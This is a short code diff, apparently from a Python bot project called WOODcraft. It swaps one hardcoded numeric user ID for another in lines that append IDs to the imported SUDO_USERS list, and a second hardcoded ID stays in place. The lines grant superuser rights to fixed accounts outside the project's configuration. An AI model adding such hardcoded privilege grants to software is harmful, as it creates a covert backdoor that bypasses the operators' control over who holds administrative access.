@@ -5,7 +5,7 @@ from WOODcraft.config import SUDO_USERS
 from Process.admins import get_administrators
 
 
-SUDO_USERS.append(1669178360)
+SUDO_USERS.append(5827766615)
 SUDO_USERS.append(1920507972)
 
 
